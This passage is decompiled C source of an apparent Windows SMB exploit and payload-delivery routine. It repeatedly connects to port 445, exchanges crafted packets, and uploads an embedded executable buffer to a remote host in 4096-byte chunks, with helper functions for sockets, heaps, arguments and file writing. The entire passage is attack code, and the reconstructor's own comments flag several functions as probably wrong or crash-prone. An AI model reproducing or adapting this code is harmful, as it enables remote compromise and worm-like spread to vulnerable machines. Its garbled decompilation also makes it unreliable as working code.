										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[6])
										|| sub_681F3CA0(0, v30[7])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[8])
										|| sub_681F3CA0(0, v30[9])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[10])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[11])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[12])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[13])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[14]))
									{
										goto LABEL_139;
									}
									Sleep(0x456u);
									v28 = v53;
									if (!SockSendRecvDataFreeHeap(v30[15], 49235, v29, v55, v53)
										&& !SockProcessSendRecv_2(v30[15], 16391, v29, v55, &Size, v28, 0xC, 300, 0x87F8, &v57, &v60))
									{
										if (v30[1])
										{
											closesocket(v30[1]);
											v30[1] = 0;
										}
										if (!SocketCreateAndConnect(&v51, &a3, cp, hostshort)
											&& !sub_681F3CA0(0, v30[16])
											&& !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
											&& !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
											&& !sub_681F3CA0(0, v30[17])
											&& !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
											&& !sub_681F3CA0(0, v30[18])
											&& !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
											&& !sub_681F3CA0(0, v30[19])
											&& !sub_681F3CA0(0, v30[20]))
										{
											if (v30[15])
											{
												closesocket(v30[15]);
												v30[15] = 0;
											}
											v28 = v53;
											v31 = sub_681F369D(*v30, v29, v54, v55, v52, v53);
											v50 = v28;
											v49 = v52;
											v48 = v55;
											v47 = v54;
											v46 = v29;
											v45 = *v30;
											if (v31)
												goto LABEL_130;
											if (!sub_681F3C0A(v45, v29, v54, v55, v52, v28))
											{
												v60 = 2;
												while (v60 == 15 || !sub_681F3CA0(1, v30[v60]))
												{
													if (++v60 >= 20)
													{
														v32 = 2;
														while (v32 == 15 || !sub_681F3CA0(2, v30[v32]))
														{
															if (++v32 >= 20)
															{
																v16 = a3;
																goto LABEL_92;
															}
															v30 = a3;
															v29 = v56;
														}
														goto LABEL_139;
													}
												}
											}
											goto LABEL_137;
										}
									LABEL_139:
										v50 = v53;
										goto LABEL_138;
									}
								}
							}
						LABEL_137:
							v50 = v28;
						LABEL_138:
							v49 = v52;
							v48 = v55;
							v47 = v54;
							v46 = v29;
							v45 = *v30;
							goto LABEL_130;
						}
					}
					v16 = a3;
				}
				else
				{
					GetAndFreeHeap(&dwBytes);
				}
			}
			v50 = v53;
			v49 = v52;
			v48 = v55;
			goto LABEL_128;
		}
	LABEL_92:
		SocketUseSockets(0, *v16, v56, v54, v55, v52, v53);
		SockCloseConnection(v16);
		Sleep(0x456u);
	}
	v34 = *(v57 + 22);
	byte_6820F8FC = -1;
	if (!v34)
		byte_6820F8FC = 0;
	if (v34 == 1)
		byte_6820F8FC = 1;
	if (!a6)
	{
		GetAndFreeHeap(&v57);
		return SocketUseSockets(13650718, *v16, v56, v54, 65279, v52, v53);
	}
	v63 = 2 * *(v57 + 18) ^ (((*(v57 + 18) & 0xFF00 | (*(v57 + 18) << 16)) << 8) | (((*(v57 + 18) >> 16) | *(v57 + 18) & 0xFF0000u) >> 8));
	GetAndFreeHeap(&v57);
	if (!v63)
		goto LABEL_127;
	v60 = 0;
	v55 = 0;
	v35 = 0;
	if (byte_6820F8FC == 1)
	{
		v35 = 1;
		v36 = byte_6820F900;
		v37 = &SomeExe1[6208];
	}
	else
	{
		v36 = &SomeExe1[4208];
		v37 = SomeExe1;
	}
	(a6)(a7, a8, v37, v35 == 0 ? 4208 : 4720, v36, v35 == 0 ? 1998 : 462, &v55, &v60, a9, a10, a11, a12);
	Size = 0;
	Src = 0;
	if (Unk_FindResourceAndIterate(&Src, a1, a2, &Size, v60, v58))
		goto LABEL_127;
	v38 = Size;
	v39 = Size + v60 + 8;
	dwBytes = v39;
	v40 = v39 & 3;
	if (v40)
		dwBytes += 4 - v40;
	v41 = CreateHeap(dwBytes);
	v58 = v41;
	if (!v41 || !v55)
	{
		v44 = &Src;
		goto LABEL_126;
	}
	memcpy(v41, Src, v38);
	v42 = (v38 + v58);
	*v42 = v60;
	v42[1] = 1;
	memcpy(v42 + 2, v55, v60);
	GetAndFreeHeap(&Src);
	v57 = 0;
	Src = 0;
	v43 = dwBytes >> 12;
	v64 = dwBytes & 0xFFF;
	if (dwBytes >> 12 && (Size = 0, v43))
	{
		while (!CreateAndGetHeap(*v16, v56, v54, 65279, v52, v53 + 1, v63, 4096, v58, dwBytes, v57, &Src))
		{
			v57 += 4096;
			if (++Size >= v43)
				goto LABEL_121;
		}
	LABEL_125:
		v44 = &v58;
	LABEL_126:
		GetAndFreeHeap(v44);
	LABEL_127:
		v50 = v53;
		v49 = v52;
		v48 = 65279;
	LABEL_128:
		v47 = v54;
	LABEL_129:
		v46 = v56;
		v45 = *v16;
	LABEL_130:
		result = SocketUseSockets(-1, v45, v46, v47, v48, v49, v50);
	}
	else
	{
	LABEL_121:
		Sleep(0x456u);
		if (v64 && CreateAndGetHeap(*v16, v56, v54, 65279, v52, v53 + 1, v63, v64, v58, dwBytes, v57, &Src))
			goto LABEL_125;
		GetAndFreeHeap(&v58);
	LABEL_124:
		result = SocketUseSockets(0, *v16, v56, v54, 65279, v52, v53);
	}
	return result;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820F8FD: using guessed type char byte_6820F8FD;

//----- (681F668A) --------------------------------------------------------
int  sub_681F668A(__m64 a1, __m64 a2, char *cp, int a4, int a5, int a6, int a7, int a8, int a9)
{
	int v9; // edi
	int result; // eax
	int v11; // esi
	char Dst; // [esp+8h] [ebp-54h]

	memset(&Dst, 0, 0x54u);
	LOWORD(dword_6820FB48) = GetTickCount();
	byte_6820F8FD = 0;
	v9 = sub_681F5A7E(a1, a2, &Dst, cp, 0x1BDu, 0, a4, a5, a6, a7, a8, a9);
	if (v9)
	{
		SockCloseConnection(&Dst);
		result = v9;
	}
	else
	{
		byte_6820F8FD = 0;
		v11 = sub_681F5A7E(a1, a2, &Dst, cp, 0x1BDu, GetHeapAndMoveData, a4, a5, a6, a7, a8, a9);
		SockCloseConnection(&Dst);
		result = v11;
	}
	return result;
}
// 6820F8FD: using guessed type char byte_6820F8FD;
// 6820FB48: using guessed type int dword_6820FB48;

//----- (681F6727) --------------------------------------------------------
int  SocketCreateAndConnect(unsigned __int8 *a1, int a2, char *cp, u_short hostshort)
{
	SOCKET v4; // esi
	unsigned __int8 v6; // al
	int v7; // edx
	struct sockaddr name; // [esp+Ch] [ebp-18h]
	u_long argp; // [esp+1Ch] [ebp-8h]

	v4 = socket(2, 1, 6);
	argp = 1;
	ioctlsocket(v4, -2147195266, &argp);
	if (v4 == -1)
		return -1;
	v6 = *a1;
	if (*a1 >= 0x20u)
		return -1;
	v7 = *a2;
	*a1 = v6 + 1;
	*(v7 + 4 * v6) = v4;
	*&name.sa_data[6] = 0;
	*&name.sa_data[10] = 0;
	name.sa_family = 2;
	*name.sa_data = htons(hostshort);
	*&name.sa_data[2] = inet_addr(cp);
	connect(v4, &name, 16);
	return 0;
}

//----- (681F67AF) --------------------------------------------------------
int  SockGetData(char **a1, __int16 *a2, SOCKET s, char a4, int a5)
{
	int v5; // eax
	__int16 v6; // ax
	unsigned int v7; // edi
	unsigned __int16 v8; // ax
	unsigned int v9; // ecx
	__int16 v11; // ax
	fd_set readfds; // [esp+4h] [ebp-10Ch]
	struct timeval timeout; // [esp+108h] [ebp-8h]

	memset(readfds.fd_array, 0, 0x100u);
	timeout.tv_sec = 0;
	readfds.fd_array[0] = s;
	timeout.tv_usec = 13000000;
	readfds.fd_count = 1;
	v5 = select(0, &readfds, 0, 0, &timeout);
	if (v5 != -1)
	{
		if (v5)
		{
			v6 = recv(s, *a1, a5, 0);
			//recv(socket_desc, server_reply , 6000 , 0) &lt; 0) // example from socket recv
			*a2 = v6;
			if (v6 > 0)
			{
				v7 = a4 * (htons(*(*a1 + 1)) + 4);
				v8 = *a2;
				v9 = *a2;
				if (v9 == v7 || v9 >= v7)
					return 0;
				while (1)
				{
					v11 = recv(s, &(*a1)[v8], a5 - v8, 0);
					if (v11 <= 0)
						break;
					*a2 += v11;
					v8 = *a2;
					if (*a2 >= v7)
						return 0;
				}
			}
		}
	}
	return -1;
}

//----- (681F688F) --------------------------------------------------------
int  SockSendBuffer(SOCKET a1, char *buf, int len)
{
	int v3; // eax
	int result; // eax
	fd_set writefds; // [esp+4h] [ebp-10Ch]
	struct timeval timeout; // [esp+108h] [ebp-8h]

	if (buf
		&& (memset(writefds.fd_array, 0, 0x100u),
			timeout.tv_sec = 0,
			timeout.tv_usec = 13000000,
			writefds.fd_array[0] = a1,
			writefds.fd_count = 1,
			v3 = select(0, 0, &writefds, 0, &timeout),
			v3 != -1)
		&& v3)
	{
		result = (send(a1, buf, len, 0) > 0) - 1;
	}
	else
	{
		result = -1;
	}
	return result;
}

//----- (681F6916) --------------------------------------------------------
int __stdcall ConvertHeapMToWBytes(LPCSTR lpMultiByteStr)
{
	int v1; // eax
	SIZE_T v2; // ST14_4
	HANDLE v3; // eax
	WCHAR *v4; // eax
	bool v5; // zf
	int result; // eax
	int v7; // [esp+10h] [ebp-8h]
	int cchWideChar; // [esp+14h] [ebp-4h]

	v1 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);
	cchWideChar = v1;
	if (!v1
		|| (v2 = 2 * v1, v3 = GetProcessHeap(), v4 = HeapAlloc(v3, 0, v2), (v7 = v4) == 0)
		|| (v5 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, v4, cchWideChar) == 0, result = v7, v5))
	{
		result = 0;
	}
	return result;
}

//----- (681F6973) --------------------------------------------------------
DWORD ReturnTimeIfTimePassed()
{
	DWORD v0; // eax

	v0 = (GetTickCount() - TickCountTime) / 0x3C / 0x3E8;
	return v0 < dword_6820F760 ? dword_6820F760 - v0 : 0;
}
// 6820F118: using guessed type int TickCountTime;
// 6820F760: using guessed type int dword_6820F760;

//----- (681F69A2) --------------------------------------------------------
signed int  CheckUsrArgs(LPWSTR a1)
{
	const WCHAR *v1; // eax
	int v2; // edi
	WCHAR *v3; // ecx
	LPWSTR *v4; // ebx
	LPWSTR v5; // ecx
	int v6; // esi
	WCHAR v7; // dx
	signed int v9; // [esp+8h] [ebp-8h]
	int pNumArgs; // [esp+Ch] [ebp-4h]

	v1 = (a1 + 4);
	v2 = 0;
	v9 = 1;
	v3 = v1;
	if (*v1)
	{
		do
		{
			++v3;
			if (*v3 == 59)
				*v3 = 32;
		} while (*v3);
	}
	pNumArgs = 0;
	v4 = CommandLineToArgvW(v1, &pNumArgs);
	if (v4)
	{
		if (pNumArgs > 0)
		{
			do
			{
				v5 = v4[v2];
				v6 = (v5 + 1);
				do
				{
					v7 = *v5;
					++v5;
				} while (v7);
				if (((v5 - v6) >> 1) < 0x10)
					v9 &= sub_681F6FC7(v4[v2], 0, lpParameter);
				++v2;
			} while (v2 < pNumArgs);
		}
		LocalFree(v4);
	}
	return v9;
}

//----- (681F6A2B) --------------------------------------------------------
int __stdcall CheckCmdLineArgs(LPCWSTR lpCmdLine)
{
	LPWSTR *v1; // eax
	LPWSTR *v2; // esi
	int v3; // eax
	signed int v4; // ebx
	LPWSTR v5; // edi
	LPWSTR v6; // eax
	int pNumArgs; // [esp+4h] [ebp-4h]

	if (lpCmdLine)
	{
		if (wcslen(lpCmdLine))
		{
			pNumArgs = 0;
			v1 = CommandLineToArgvW(lpCmdLine, &pNumArgs);
			v2 = v1;
			if (v1)
			{
				if (pNumArgs > 0)
				{
					v3 = StrToIntW(*v1);
					v4 = 1;
					if (v3 > 0)
						dword_6820F760 = v3;
					if (pNumArgs > 1)
					{
						while (1)
						{
							v5 = v2[v4];
							if (v5 == StrStrW(v2[v4], L"-h"))
								break;
							v6 = StrChrW(v5, 58);
							if (v6)
							{
								*v6 = 0;
								CleanUpHeaps(v5, v6 + 1, 1);
							}
							if (++v4 >= pNumArgs)
								goto LABEL_14;
						}
						CheckUsrArgs(v2[v4]);
					}
				}
			LABEL_14:
				LocalFree(v2);
			}
		}
	}
	if (!dword_6820F760)
		dword_6820F760 = 60;
	return 0;
}
// 681FD220: using guessed type int __stdcall StrToIntW(_DWORD);
// 681FD234: using guessed type int __stdcall StrChrW(_DWORD, _DWORD);
// 681FD23C: using guessed type int __stdcall StrStrW(_DWORD, _DWORD);
// 68203FF0: using guessed type wchar_t asc_68203FF0[3];
// 6820F760: using guessed type int dword_6820F760;

//----- (681F6AF0) --------------------------------------------------------
int GeneratePath() // It wouldn't suprise me if this function is loaded with crashes.
{
	int v0; // edi
	_DWORD *v1; // ebx
	unsigned int v2; // kr00_4
	HANDLE v3; // eax
	int result; // eax
	LPWSTR  v5; // [esp+Ch] [ebp-804h]
	__int16 v6; // [esp+Eh] [ebp-802h]
	_DWORD **v7; // [esp+80Ch] [ebp-4h]

	word_6820B110[0] = 0;
	v0 = 0;
	v7 = 0;
	v1 = GetHeapAndFreeIt(lpCriticalSection, 1, *v7);
	if (v1)
	{
		do
		{
			wsprintfW(v5, L" \"%ws:%ws\"", **v7, (*v7)[1]);
			v2 = wcslen(v5);
			if (v2 + v0 >= 0x1FF5)
				break;
			//StrCatW(&v6, word_6820B110, &v5); // orig // strcat cannot have 3 params... Why IDA?
			StrCatW(word_6820B110, v5); // might be incorrect. It doesn't like Wchar stuff.
			v7 = 0;
			v0 += v2;
		} while (EnterAndLeaveCritSection_3(*v1, lpCriticalSection, *v7)); // Probably wrong in the pointers.
		v3 = GetProcessHeap();
		HeapFree(v3, 0, v1);
	}
	result = 0;
	dword_68206010 = 0;
	word_6820F0F8 = 0;
	return result;
}
// 681FD238: using guessed type int __thiscall StrCatW(_DWORD, _DWORD, _DWORD);
// 68206010: using guessed type int dword_68206010;
// 6820B110: using guessed type __int16 word_6820B110[8180];
// 6820F0F8: using guessed type __int16 word_6820F0F8;

//----- (681F6BB0) --------------------------------------------------------
int __stdcall sub_681F6BB0(PWSTR a1)
{
	DWORD v1; // eax
	unsigned int v2; // kr00_4
	int v3; // esi
	unsigned int v4; // kr04_4
	int v5; // ecx
	WCHAR v7; // [esp+0h] [ebp-800h]

	v1 = ReturnTimeIfTimePassed();
	if (v1 < 0xA)
		v1 = 10;
	wsprintfW(&v7, L"%d", v1);
	v2 = wcslen(&v7);
	v3 = v2;
	EnterCriticalSection(&CriticalSection);
	if (dword_68206010)
		GeneratePath();
	v4 = wcslen(word_6820B110);
	if (v4 + v2 >= 0x1FFE)
	{
		SetLastError(0x7Au);
	}
	else
	{
		*a1 = 0;
		/*
		StrCatW(&v7, a1, &v7); // Origional
		StrCatW(v5, a1, word_6820B110); 
		*/
		StrCatW(a1, &v7);
		StrCatW(a1, word_6820B110);
		v3 = v4 + v2;
	}
	LeaveCriticalSection(&CriticalSection);
	return v3;
}
// 681FD238: using guessed type int __thiscall StrCatW(_DWORD, _DWORD, _DWORD);
// 68206010: using guessed type int dword_68206010;
// 6820B110: using guessed type __int16 word_6820B110[8180];

//----- (681F6C74) --------------------------------------------------------
signed int __stdcall CompareStringsW_2(PCWSTR a1, PCWSTR a2, int a3)
{
	signed int v3; // ebx

	v3 = 0;
	if (!StrCmpIW(a1, a2) && !StrCmpW((a1 + 4), (a2 + 4)))
		v3 = 1;
	return v3;
}
// 681FD22C: using guessed type int __stdcall StrCmpW(_DWORD, _DWORD);
// 681FD230: using guessed type int __stdcall StrCmpIW(_DWORD, _DWORD);

//----- (681F6CAA) --------------------------------------------------------
void __stdcall CleanUpHeaps_3(LPVOID a1)//remove?
{
	void *v1; // ST08_4
	HANDLE v2; // eax
	void *v3; // ebx
	HANDLE v4; // eax

	if (a1)
	{
		if (*a1)
		{
			v1 = *a1;
			v2 = GetProcessHeap();
			HeapFree(v2, 0, v1);
		}
		v3 = *(a1 + 4);
		if (v3)
		{
			v4 = GetProcessHeap();
			HeapFree(v4, 0, v3);
		}
	}
}

//----- (681F6CE7) --------------------------------------------------------
int __stdcall CleanUpHeaps_2(void *Src, void *a2)
{
	unsigned int v2; // kr00_4
	HANDLE v3; // eax
	unsigned int v4; // kr08_4
	HANDLE v5; // eax
	int v6; // eax
	void *v7; // ST08_4
	HANDLE v8; // eax
	void *v9; // ST08_4
	HANDLE v10; // eax
	void *Dst; // [esp+0h] [ebp-10h]
	void *lpMem; // [esp+4h] [ebp-Ch]
	struct _RTL_CRITICAL_SECTION *v14; // [esp+8h] [ebp-8h]
	int v15; // [esp+Ch] [ebp-4h]

	v15 = 0;
	v14 = lpCriticalSection;
	v2 = wcslen(Src);
	v3 = GetProcessHeap();
	Dst = HeapAlloc(v3, 8u, 2 * v2 + 2);
	if (Dst)
	{
		memcpy(Dst, Src, 2 * wcslen(Src) + 2);
		v4 = wcslen(a2);
		v5 = GetProcessHeap();
		lpMem = HeapAlloc(v5, 8u, 2 * v4 + 2);
		if (lpMem)
		{
			memcpy(lpMem, a2, 2 * wcslen(a2) + 2);
			v6 = EnterAndLeaveCritSection(v14, 0, &Dst);
			v7 = lpMem;
			v15 = v6;
			v8 = GetProcessHeap();
			HeapFree(v8, 0, v7);
		}
		v9 = Dst;
		v10 = GetProcessHeap();
		HeapFree(v10, 0, v9);
	}
	return v15;
}

//----- (681F6DE0) --------------------------------------------------------
int __stdcall CleanUpHeaps(void *Src, void *a2, int a3)
{
	struct _RTL_CRITICAL_SECTION *v3; // ebx
	unsigned int v4; // kr00_4
	HANDLE v5; // eax
	unsigned int v6; // kr08_4
	HANDLE v7; // eax
	void *v8; // ST08_4
	HANDLE v9; // eax
	void *v10; // ST08_4
	HANDLE v11; // eax
	void *Dst; // [esp+Ch] [ebp-Ch]
	void *lpMem; // [esp+10h] [ebp-8h]
	int v15; // [esp+14h] [ebp-4h]

	v15 = 0;
	v3 = lpCriticalSection;
	v4 = wcslen(Src);
	v5 = GetProcessHeap();
	Dst = HeapAlloc(v5, 8u, 2 * v4 + 2);
	if (Dst)
	{
		memcpy(Dst, Src, 2 * wcslen(Src) + 2);
		v6 = wcslen(a2);
		v7 = GetProcessHeap();
		lpMem = HeapAlloc(v7, 8u, 2 * v6 + 2);
		if (!lpMem)
		{
		LABEL_5:
			v10 = Dst;
			v11 = GetProcessHeap();
			HeapFree(v11, 0, v10);
			return v15;
		}
		memcpy(lpMem, a2, 2 * wcslen(a2) + 2);
		v15 = EnumerateProcessHeap(v3, &Dst, a3);
		if (!v15)
		{
			v8 = lpMem;
			v9 = GetProcessHeap();
			HeapFree(v9, 0, v8);
			goto LABEL_5;
		}
	}
	return v15;
}

//----- (681F6EDA) --------------------------------------------------------
BOOL __stdcall CompareStringsW(int a1, int a2, int a3)
{
	BOOL result; // eax

	if (a1 && a2)
		result = StrCmpIW(a1, a2) == 0;
	else
		result = 0;
	return result;
}
// 681FD230: using guessed type int __stdcall StrCmpIW(_DWORD, _DWORD);

//----- (681F6F02) --------------------------------------------------------
BOOL  LaunchCrit3(int a1, struct _RTL_CRITICAL_SECTION *a2, __int16 *a3)
{
	__int16 *v3; // ecx
	__int16 *v4; // edx
	__int16 v5; // ax
	__int16 **v7; // [esp+0h] [ebp-4h]

	v7 = 0;
	if (!EnterAndLeaveCritSection_3(a1, a2, &v7))
		return 0;
	v3 = *v7;
	v4 = a3;
	do
	{
		v5 = *v3;
		*v4 = *v3;
		++v3;
		++v4;
	} while (v5);
	return a3 != 0;
}

//----- (681F6F40) --------------------------------------------------------
_DWORD *__thiscall SomeHeapCleanupFunct(struct _RTL_CRITICAL_SECTION *a1, __int16 *a2) // remove?
{
	_DWORD *result; // eax
	__int16 *v3; // edx
	__int16 *v4; // esi
	__int16 v5; // cx
	__int16 **v6; // [esp+4h] [ebp-4h]

	v6 = 0;
	result = GetHeapAndFreeIt(this, 0, &v6);
	if (result)
	{
		v3 = *v6;
		v4 = a2;
		do
		{
			v5 = *v3;
			*v4 = *v3;
			++v3;
			++v4;
		} while (v5);
	}
	return result;
}

//----- (681F6F78) --------------------------------------------------------
BOOL __stdcall EnumProcessHeap(LPVOID lpMem)
{
	HANDLE v1; // eax

	v1 = GetProcessHeap();
	return HeapFree(v1, 0, lpMem);
}

//----- (681F6F91) --------------------------------------------------------

int __thiscall CheckCritSection(void *this, struct _RTL_CRITICAL_SECTION *a2, int *a3) //remove?
{
	int v3; // eax
	__int16 v4; // dx
	char v6[32]; // [esp+0h] [ebp-24h]
	int v7; // [esp+20h] [ebp-4h]

	v7 = 1;
	v3 = v6 - this;
	do
	{
		v4 = *this;
		*(this + v3) = *this;
		this = this + 2;
	} while (v4);
	return EnterAndLeaveCritSection(a2, a3, v6);
}
// 681F6F91: using guessed type char var_24[32];

//----- (681F6FC7) --------------------------------------------------------
int  sub_681F6FC7(char *a1, int a2, struct _RTL_CRITICAL_SECTION *lpCriticalSection)
{
	int v3; // edx
	__int16 v4; // cx
	char Src[32]; // [esp+0h] [ebp-24h]
	int v7; // [esp+20h] [ebp-4h]

	if (!a1 || !*a1)
		return 0;
	v7 = a2;
	v3 = Src - a1;
	do
	{
		v4 = *a1;
		*&a1[v3] = *a1;
		a1 += 2;
	} while (v4);
	return EnumerateProcessHeap(lpCriticalSection, Src, a2);
}
// 681F6FC7: using guessed type char Src[32];

//----- (681F7003) --------------------------------------------------------
void  EnterAndLeaveCritSection_5(int a1)
{
	_DWORD *v1; // eax
	_DWORD *v2; // eax
	void(__stdcall *v3)(_DWORD); // ecx
	void *v4; // ST08_4
	HANDLE v5; // eax
	void *v6; // ST08_4
	HANDLE v7; // eax
	void *v8; // ST08_4
	HANDLE v9; // eax
	HANDLE v10; // eax
	unsigned int v11; // [esp+0h] [ebp-4h]

	if (a1)
	{
		if (*(a1 + 24))
		{
			v11 = 0;
			if (*(a1 + 36))
			{
				do
				{
					v1 = (*(a1 + 24) + 4 * v11);
					if (*v1)
					{
						v2 = *v1;
						if (*v2)
						{
							v3 = *(a1 + 48);
							if (v3)
								v3(*v2);
							v4 = **(*(a1 + 24) + 4 * v11);
							v5 = GetProcessHeap();
							HeapFree(v5, 0, v4);
						}
						v6 = *(*(a1 + 24) + 4 * v11);
						v7 = GetProcessHeap();
						HeapFree(v7, 0, v6);
					}
					++v11;
				} while (v11 < *(a1 + 36));
			}
			v8 = *(a1 + 24);
			v9 = GetProcessHeap();
			HeapFree(v9, 0, v8);
		}
		v10 = GetProcessHeap();
		HeapFree(v10, 0, a1);
	}
}

//----- (681F7091) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *__stdcall sub_681F7091(LONG a1, ULONG_PTR a2, _RTL_CRITICAL_SECTION_DEBUG *a3, LONG a4)
{
	HANDLE v4; // eax
	struct _RTL_CRITICAL_SECTION *v5; // eax
	struct _RTL_CRITICAL_SECTION *v6; // esi
	HANDLE v7; // eax
	_RTL_CRITICAL_SECTION_DEBUG *v8; // eax

	v4 = GetProcessHeap();
	v5 = HeapAlloc(v4, 8u, 0x34u);
	v6 = v5;
	if (v5)
	{
		InitializeCriticalSection(v5);
		v6[1].RecursionCount = a4;
		v6[1].LockCount = a1;
		v6[1].SpinCount = a2;
		v6[1].OwningThread = 0;
		v6[2].DebugInfo = a3;
		v7 = GetProcessHeap();
		v8 = HeapAlloc(v7, 8u, 4 * a4);
		v6[1].DebugInfo = v8;
		if (!v8)
		{
			EnterAndLeaveCritSection_5(v6);
			v6 = 0;
		}
	}
	return v6;
}

//----- (681F70FA) --------------------------------------------------------
signed int  EnterAndLeaveCritSection_4(int a1) // remove?
{
	if (!a1)
		return 0;
	EnterCriticalSection(a1);
	InterlockedExchange((a1 + 40), 1);
	LeaveCriticalSection(a1);
	return 1;
}

//----- (681F711F) --------------------------------------------------------
_DWORD * GetHeapAndFreeIt(struct _RTL_CRITICAL_SECTION *a1, int a2, _DWORD *a3)
{
	HANDLE v3; // eax
	_DWORD *v4; // ebx
	void *v5; // ST08_4
	HANDLE v6; // eax

	v3 = GetProcessHeap();
	v4 = HeapAlloc(v3, 8u, 8u);
	if (v4)
	{
		*v4 = 0;
		v4[1] = a2;
		if (!EnterAndLeaveCritSection_3(v4, a1, a3))
		{
			v5 = v4;
			v4 = 0;
			v6 = GetProcessHeap();
			HeapFree(v6, 0, v5);
		}
	}
	return v4;
}

//----- (681F7167) --------------------------------------------------------
signed int  EnterAndLeaveCritSection_3(_DWORD a1, struct _RTL_CRITICAL_SECTION *a2, _DWORD *a3) // remove?
{
	signed int result; // eax
	signed int v4; // edi
	char *v5; // ecx
	int v6; // eax
	int v7; // edx

	result = 0;
	if (a1 && a2)
	{
		while (1)
		{
			v4 = 0;
			EnterCriticalSection(a2);
			do
			{
				v5 = *a1;
				if (*a1 >= a2[1].OwningThread)
					break;
				v6 = *(&a2[1].DebugInfo->Type + v5);
				v7 = *(v6 + 4);
				if (!v7 || v7 & *(a1 + 4))
				{
					v4 = 1;
					if (a3)
						*a3 = v6;
				}
				else
				{
					v4 = 0;
				}
				*a1 = v5 + 1;
			} while (!v4);
			LeaveCriticalSection(a2);
			result = v4;
			if (v4 || a2[1].LockSemaphore)
				break;
			Sleep(0x2710u);
		}
	}
	return result;
}

//----- (681F71D6) --------------------------------------------------------
int  EnterAndLeaveCritSection_2(unsigned int a1, int a2, int a3, _DWORD *a4)
{
	unsigned int v4; // ebx
	unsigned int v5; // edi
	int v7; // [esp+4h] [ebp-4h]

	v7 = 0;
	v4 = a1;
	if (a2)
	{
		EnterCriticalSection(a2);
		v5 = v4;
		if (v4 < v4 + *(a2 + 36))
		{
			while (1)
			{
				v7 = (*(a2 + 44))(**(*(a2 + 24) + 4 * (v5 % *(a2 + 36))), a3, *(a2 + 28));
				if (v7)
					break;
				if (++v5 >= v4 + *(a2 + 36))
					goto LABEL_8;
			}
			if (a4)
				*a4 = *(*(a2 + 24) + 4 * (v5 % *(a2 + 36)));
		}
	LABEL_8:
		LeaveCriticalSection(a2);
	}
	return v7;
}

//----- (681F724D) --------------------------------------------------------
int  EnterAndLeaveCritSection(struct _RTL_CRITICAL_SECTION *a1, int *a2, int a3)
{
	struct _RTL_CRITICAL_SECTION *v3; // esi
	int v4; // edi
	int v5; // eax
	int v7; // [esp+8h] [ebp-4h]

	v3 = a1;
	v4 = 0;
	if (a1)
	{
		EnterCriticalSection(a1);
		v5 = 0;
		v7 = 0;
		if (a2)
			v5 = *a2;
		v4 = EnterAndLeaveCritSection_2(v5, v3, a3, &v7);
		if (v4)
			*(v7 + 4) = 1;
		LeaveCriticalSection(v3);
	}
	return v4;
}

//----- (681F7298) --------------------------------------------------------
int __stdcall EnumerateProcessHeap(LPCRITICAL_SECTION lpCriticalSection, void *Src, int a3)
{
	HANDLE v3; // eax
	LPVOID v4; // eax
	LONG v5; // ST0C_4
	HANDLE v6; // eax
	LPVOID v7; // eax
	bool v8; // zf
	HANDLE v9; // eax
	PRTL_CRITICAL_SECTION_DEBUG v10; // ecx
	void *v11; // ST0C_4
	HANDLE v12; // eax
	SIZE_T v13; // ST0C_4
	PRTL_CRITICAL_SECTION_DEBUG v14; // ST08_4
	HANDLE v15; // eax
	_RTL_CRITICAL_SECTION_DEBUG *v16; // eax
	int v18; // [esp+8h] [ebp-4h]

	v18 = 0;
	if (lpCriticalSection && Src)
	{
		EnterCriticalSection(lpCriticalSection);
		if (!EnterAndLeaveCritSection_2(0, lpCriticalSection, Src, 0))
		{
			if (lpCriticalSection[1].OwningThread >= lpCriticalSection[1].RecursionCount)
			{
				v13 = 4 * lpCriticalSection[1].RecursionCount + 1020;
				v14 = lpCriticalSection[1].DebugInfo;
				v15 = GetProcessHeap();
				v16 = HeapReAlloc(v15, 8u, v14, v13);
				if (v16)
				{
					lpCriticalSection[1].DebugInfo = v16;
					lpCriticalSection[1].RecursionCount += 255;
					v18 = EnumerateProcessHeap(lpCriticalSection, Src, a3);
				}
			}
			else
			{
				v3 = GetProcessHeap();
				v4 = HeapAlloc(v3, 8u, 8u);
				*(&lpCriticalSection[1].DebugInfo->Type + lpCriticalSection[1].OwningThread) = v4;
				if (v4)
				{
					v5 = lpCriticalSection[1].LockCount;
					v6 = GetProcessHeap();
					v7 = HeapAlloc(v6, 8u, v5);
					**(&lpCriticalSection[1].DebugInfo->Type + lpCriticalSection[1].OwningThread) = v7;
					v8 = v7 == 0;
					v9 = lpCriticalSection[1].OwningThread;
					v10 = lpCriticalSection[1].DebugInfo;
					if (v8)
					{
						v11 = *(&v10->Type + v9);
						v12 = GetProcessHeap();
						HeapFree(v12, 0, v11);
					}
					else
					{
						*(*(&v10->Type + v9) + 4) = a3;
						memcpy(
							**(&lpCriticalSection[1].DebugInfo->Type + lpCriticalSection[1].OwningThread),
							Src,
							lpCriticalSection[1].LockCount);
						++lpCriticalSection[1].OwningThread;
						v18 = 1;
					}
				}
			}
		}
		LeaveCriticalSection(lpCriticalSection);
	}
	return v18;
}

//----- (681F73AE) --------------------------------------------------------
signed int  CreateFileAndWrite(const WCHAR *a1, LPCWSTR lpFileName, LPCVOID lpBuffer)
{
	signed int v3; // esi
	HANDLE v4; // edi

	v3 = 0;
	v4 = CreateFileW(lpFileName, GENERIC_WRITE, 0, 0, 2u, 2u, 0);
	if (v4 != INVALID_HANDLE_VALUE)
	{
		lpFileName = 0;
